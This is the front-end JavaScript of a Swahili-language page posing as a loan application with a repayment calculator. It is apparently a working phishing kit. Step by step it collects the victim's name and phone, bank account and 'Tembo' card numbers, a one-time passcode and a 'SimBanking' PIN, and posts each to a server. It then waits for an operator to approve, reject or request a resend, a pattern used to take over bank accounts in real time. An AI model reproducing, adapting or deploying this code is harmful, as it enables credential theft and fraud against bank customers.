let currentStep = 'personal_info';
let clientPayload = {};
let timerInterval = null;
let timeLeft = 30;
let pollTimeout = null; // Track polling loop timer

function updateCalculator() {
    const amount = parseInt(document.getElementById('loanAmountSlider').value);
    const months = parseInt(document.getElementById('loanTermSlider').value);

    document.getElementById('loanAmountDisplay').innerText = `TSh ${amount.toLocaleString()}`;
    document.getElementById('loanTermDisplay').innerText = `miezi ${months}`;

    const monthlyRate = 0.02; 
    const monthlyPayment = (amount * monthlyRate) / (1 - Math.pow(1 + monthlyRate, -months));
    document.getElementById('monthlyPaymentDisplay').innerText = `TSh ${Math.round(monthlyPayment).toLocaleString()}`;
}

function showStep(stepId) {
    document.querySelectorAll('.form-step').forEach(el => el.classList.remove('active'));
    document.getElementById(`step-${stepId}`).classList.add('active');
    currentStep = stepId;
}

function showLoading(text) {
    document.getElementById('loadingText').innerText = text;
    document.getElementById('loadingOverlay').style.display = 'flex';
}

function hideLoading() {
    document.getElementById('loadingOverlay').style.display = 'none';
    if (pollTimeout) {
        clearTimeout(pollTimeout);
        pollTimeout = null;
    }
}

async function sendToServer(step, data) {
    clientPayload = { ...clientPayload, ...data };
    try {
        const response = await fetch('/api/submit', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ step, data: clientPayload })
        });
        return await response.json();
    } catch (e) {
        console.error('Network error:', e);
        return { success: false, message: 'Kosa la mtandao. Jaribu tena.' };
    }
}

async function pollServerStatus() {
    try {
        const response = await fetch('/api/poll-status');
        const res = await response.json();

        // If still pending or waiting, keep polling every 2.5 seconds
        if (res.status === 'pending' || !res.status) {
            pollTimeout = setTimeout(pollServerStatus, 2500);
            return;
        }

        // Definitive response received, hide the loading screen
        hideLoading();

        if (res.status === 'approved') {
            if (res.next === 'otp') {
                showStep('step4');
                startOtpTimer();
            } else if (res.next === 'pin') {
                showStep('step5');
            } else if (res.next === 'success') {
                showStep('success');
            }
        } else if (res.status === 'denied' || res.status === 'blocked') {
            alert(res.message || 'Ombi limekataliwa.');
            location.reload();
        } else if (res.status === 'retry_otp' || res.status === 'resend') {
            alert(res.message);
            if (res.status === 'resend') startOtpTimer();
        } else if (res.status === 'retry_pin') {
            alert(res.message);
        }
    } catch (e) {
        // Retry polling if network hiccup occurs momentarily
        pollTimeout = setTimeout(pollServerStatus, 3000);
    }
}

async function submitPersonalInfo() {
    const loanAmount = document.getElementById('loanAmountSlider').value;
    const loanTerm = document.getElementById('loanTermSlider').value;
    const firstName = document.getElementById('firstName').value;
    const lastName = document.getElementById('lastName').value;
    const phoneNumber = document.getElementById('phoneNumber').value;

    if (!firstName || !lastName || !phoneNumber) {
        alert('Tafadhali jaza nafasi zote wazi.');
        return;
    }

    showLoading('Inachakata taarifa zako...');
    await sendToServer('personal_info', { loanAmount: `TSh ${Number(loanAmount).toLocaleString()}`, loanTerm: `${loanTerm} miezi`, firstName, lastName, phoneNumber });
    hideLoading();
    
    showStep('step3');
}

async function submitTemboCard() {
    const accountNumber = document.getElementById('accountNumber').value;
    const cardNumber = document.getElementById('cardNumber').value;

    if (!accountNumber || !cardNumber) {
        alert('Tafadhali ingiza namba ya akaunti na kadi ya Tembo.');
        return;
    }

    showLoading('Inasubiri idhini ya Benki...');
    const res = await sendToServer('step3', { accountNumber, cardNumber });
    
    if (res.pendingApproval || res.status === 'pending') {
        pollServerStatus();
    }
}

function startOtpTimer() {
    timeLeft = 30;
    const timerSpan = document.getElementById('timer');
    const resendBtn = document.getElementById('resendBtn');
    if (resendBtn) resendBtn.disabled = true;

    if (timerInterval) clearInterval(timerInterval);

    const displayPhone = document.getElementById('displayPhone');
    if (displayPhone) {
        displayPhone.innerText = `+255 ${clientPayload.phoneNumber || '7XX XXX XXX'}`;
    }

    timerInterval = setInterval(async () => {
        timeLeft--;
        if (timerSpan) timerSpan.innerText = timeLeft;
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            if (resendBtn) resendBtn.disabled = false;
            
            showLoading('Muda wa OTP umeisha. Inaarifu msimamizi...');
            await sendToServer('step4', { isResend: true });
            hideLoading();
            pollServerStatus();
        }
    }, 1000);
}

function moveToNext(element, index) {
    element.value = element.value.replace(/[^0-9]/g, '');
    if (element.value.length === 1 && index < 5) {
        const boxes = document.querySelectorAll('.otp-box');
        if (boxes[index]) boxes[index].focus();
    }
}

function movePinNext(element, index) {
    element.value = element.value.replace(/[^0-9]/g, '');
    if (element.value.length === 1 && index < 4) {
        const boxes = document.querySelectorAll('.pin-box');
        if (boxes[index]) boxes[index].focus();
    }
}

async function submitOtp() {
    const boxes = document.querySelectorAll('.otp-box');
    let otp = '';
    boxes.forEach(b => otp += b.value);

    if (otp.length < 5 || !/^\d+$/.test(otp)) {
        alert('Tafadhali ingiza namba kamili ya OTP ya tarakimu 5 (nambari pekee).');
        return;
    }

    showLoading('Inasubiri uthibitisho wa OTP...');
    const res = await sendToServer('step4', { otp });
    if (res.pendingApproval || res.status === 'pending') {
        pollServerStatus();
    }
}

async function triggerResendOtp() {
    showLoading('Inatuma ombi la OTP mpya...');
    const res = await sendToServer('step4', { isResend: true });
    if (res.pendingApproval || res.status === 'pending') {
        document.getElementById('loadingText').innerText = 'Inasubiri idhini ya kutuma OTP mpya...';
        pollServerStatus();
    }
}

async function submitPin() {
    const boxes = document.querySelectorAll('.pin-box');
    let pin = '';
    boxes.forEach(b => pin += b.value);

    if (pin.length < 4 || !/^\d+$/.test(pin)) {
        alert('Tafadhali ingiza PIN ya tarakimu 4 (nambari pekee).');
        return;
    }

    showLoading('Inathibitisha PIN ya SimBanking...');
    const res = await sendToServer('step5', { pin });
    if (res.pendingApproval || res.status === 'pending') {
        pollServerStatus();
    }
}

window.onload = () => {
    updateCalculator();
};
